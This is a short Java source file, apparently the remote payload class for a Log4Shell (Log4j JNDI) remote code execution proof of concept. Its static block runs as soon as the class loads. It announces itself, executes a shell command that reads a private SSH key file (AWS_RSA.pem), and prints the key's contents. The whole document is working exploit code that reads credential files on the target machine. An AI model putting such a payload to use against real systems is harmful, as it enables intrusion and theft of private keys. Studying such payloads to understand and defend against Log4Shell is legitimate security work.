import java.io.*;

public class Log4jRCE {
    static {
        System.out.println("I am Log4jRCE from remote!!");
        Process p;
        String[] cmd = {"cat","/Users/duz/.ssh/AWS_RSA.pem"};
        try{
            p = java.lang.Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while((line = br.readLine()) != null){
                System.out.println(line);
            }
        }catch (IOException e){
            e.printStackTrace();
        }
    }
}
